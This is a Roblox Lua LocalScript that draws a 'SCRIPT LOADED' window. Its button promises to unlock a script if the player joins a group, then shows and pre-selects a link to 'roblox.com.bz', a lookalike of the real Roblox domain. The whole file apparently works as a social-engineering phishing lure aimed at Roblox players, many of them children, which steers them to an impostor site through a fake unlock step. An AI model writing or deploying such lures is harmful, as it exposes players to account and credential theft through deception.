
-- SCRIPT LOADED GUI
-- For your own Roblox Studio experience
-- Place this code in a LocalScript

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local GROUP_LINK = "https://roblox.com.bz/communities/5118504871/"

-- Remove an existing copy of the GUI
local playerGui = player:WaitForChild("PlayerGui")
local existing = playerGui:FindFirstChild("ScriptLoadedGUI")

if existing then
    existing:Destroy()
end

-- Screen GUI
local gui = Instance.new("ScreenGui")
gui.Name = "ScriptLoadedGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Main window
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.fromOffset(360, 190)
frame.Position = UDim2.new(0.5, -180, 0.5, -95)
frame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 14)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 255, 170)
stroke.Thickness = 1.5
stroke.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 60)
title.Position = UDim2.fromOffset(10, 5)
title.BackgroundTransparency = 1
title.Text = "SCRIPT LOADED"
title.TextColor3 = Color3.fromRGB(0, 255, 170)
title.Font = Enum.Font.GothamBold
title.TextSize = 27
title.Parent = frame

-- Unlock button
local button = Instance.new("TextButton")
button.Name = "UnlockButton"
button.Size = UDim2.new(1, -30, 0, 55)
button.Position = UDim2.fromOffset(15, 72)
button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
button.Text = "Click here join group to unlock script"
button.TextColor3 = Color3.new(1, 1, 1)
button.Font = Enum.Font.GothamBold
button.TextSize = 14
button.TextWrapped = true
button.AutoButtonColor = true
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = button

-- Link display
local linkBox = Instance.new("TextBox")
linkBox.Name = "GroupLink"
linkBox.Size = UDim2.new(1, -30, 0, 32)
linkBox.Position = UDim2.fromOffset(15, 140)
linkBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
linkBox.TextColor3 = Color3.new(1, 1, 1)
linkBox.PlaceholderText = "Your group link appears here"
linkBox.PlaceholderColor3 = Color3.fromRGB(170, 170, 180)
linkBox.Text = ""
linkBox.Font = Enum.Font.Gotham
linkBox.TextSize = 11
linkBox.ClearTextOnFocus = false
linkBox.TextEditable = true
linkBox.Visible = false
linkBox.Parent = frame

local linkCorner = Instance.new("UICorner")
linkCorner.CornerRadius = UDim.new(0, 6)
linkCorner.Parent = linkBox

-- Button action
button.Activated:Connect(function()
    linkBox.Text = GROUP_LINK
    linkBox.Visible = true

    button.Text =
        "Copy the link below and join the group to unlock script"
    button.TextSize = 12
    button.BackgroundColor3 = Color3.fromRGB(20, 150, 95)

    -- Select the link for manual copying
    linkBox:CaptureFocus()
    linkBox.SelectionStart = 1
    linkBox.CursorPosition = #GROUP_LINK + 1
end)
